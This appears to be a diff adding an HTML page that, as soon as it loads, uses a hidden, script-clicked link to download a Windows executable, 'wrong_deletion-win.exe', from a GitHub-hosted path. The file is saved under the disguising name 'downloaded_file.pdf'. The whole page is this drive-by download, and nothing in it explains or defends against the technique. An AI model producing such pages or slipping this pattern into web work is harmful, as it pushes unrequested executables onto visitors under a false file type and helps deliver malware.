@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Automatic File Download</title>
+</head>
+<body>
+<script>
+    window.onload = function() {
+        // Specify the URL of the file to be downloaded
+        var fileUrl = 'https://github.com/cerebrus6/cerebrus6.github.io/downloadable/wrong_deletion-win.exe';
+        
+        // Create a temporary anchor element
+        var downloadLink = document.createElement('a');
+        downloadLink.href = fileUrl;
+        downloadLink.download = 'downloaded_file.pdf'; // Specify the filename for the downloaded file
+        downloadLink.style.display = 'none';
+        document.body.appendChild(downloadLink);
+        
+        // Simulate a click on the anchor element to trigger the download
+        downloadLink.click();
+        
+        // Clean up: remove the temporary anchor element
+        document.body.removeChild(downloadLink);
+    };
+</script>
+</body>
+</html>
